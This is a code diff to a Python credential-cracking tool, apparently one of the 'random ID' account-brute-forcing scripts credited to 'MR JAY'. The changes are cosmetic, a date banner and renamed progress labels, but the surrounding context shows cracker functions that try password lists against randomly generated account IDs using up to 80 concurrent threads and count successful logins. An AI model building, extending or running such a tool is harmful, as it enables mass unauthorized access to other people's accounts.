@@ -234,6 +234,22 @@ def cek_apk(session,coki):
     game = [i.text for i in x.find_all("h3")]
     if len(game)==0:
             pass  
+current = dt.now()
+day = current.day
+month = current.month
+year = current.year
+hour = current.hour
+minute = current.minute
+second = current.second
+if hour > 12:
+    hourx = hour-12
+    tag = "PM"
+else:
+    hourx = hour
+    tag = "AM"
+timex = f"{hour}:{minute}{tag}"
+datex = f"{day}/{month}/{year}"
+
 def clear():
     os.system("clear")
     print(logo)
@@ -252,7 +268,7 @@ db. 88  88   88    88
 Y8888P  YP   YP    YP \033[1;34m ᴾᴿᴼ
 \033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 \033[1;32m[\033[1;31m✓\033[1;32m] Author     : MR JAY
-\033[1;32m[\033[1;31m✓\033[1;32m] ABOUTS     : keep having fun
+\033[1;32m[\033[1;31m✓\033[1;32m] TODAY     : {datex}"
 \033[1;32m[\033[1;31m✓\033[1;32m] Tool Types :\033[1;36m RANDOM 
 \033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
 myid=uuid.uuid4().hex[:5].upper()
@@ -309,7 +325,7 @@ def main():
         awm = "".join(random.choice(string.digits) for _ in range(6))
         gen.append(awm)
     with ThreadPoolExecutor(max_workers=80) as Submits:
-        print(47*"\x1b[1;97m—") 
+        print(45*"\x1b[1;92m━") 
         for next in gen:
             ids = code + next
             mk = ids[:6]
@@ -326,7 +342,7 @@ def convert(cookie):
 def cracker(ids,passlist):
     global loop,oks,cps
     session = requests.Session()
-    sys.stdout.write('\r \033[1;97m[\x1b[1;92mRNDM•1\x1b[1;97m] \x1b[1;92m%s\x1b[1;97m | \x1b[1;92m%s\x1b[1;97m \r'%(loop,len(oks))),
+    sys.stdout.write('\r \033[1;97m[\x1b[1;92mJAY•1\x1b[1;97m] \x1b[1;92m%s\x1b[1;97m | \x1b[1;92m%s\x1b[1;97m \r'%(loop,len(oks))),
     sys.stdout.flush()
     try:
         for pas in passlist:
@@ -425,7 +441,7 @@ def mainn():
         awm = "".join(random.choice(string.digits) for _ in range(6))
         gen.append(awm)
     with ThreadPoolExecutor(max_workers=60) as Submits:
-        print(47*"\x1b[1;97m—") 
+        print(45*"\x1b[1;92m━") 
         for next in gen:
             ids = code + next
             mk = ids[:6]
@@ -442,7 +458,7 @@ def convert(cookie):
 def crackerr(ids,passlist):
     global loop,oks,cps
     session = requests.Session()
-    sys.stdout.write('\r \033[1;97m[\x1b[1;92mRNDM•2\x1b[1;97m] \x1b[1;92m%s\x1b[1;97m | \x1b[1;92m%s\x1b[1;97m \r'%(loop,len(oks))),
+    sys.stdout.write('\r \033[1;97m[\x1b[1;92mJAY•2\x1b[1;97m] \x1b[1;92m%s\x1b[1;97m | \x1b[1;92m%s\x1b[1;97m \r'%(loop,len(oks))),
     sys.stdout.flush()
     try:
         for pas in passlist:
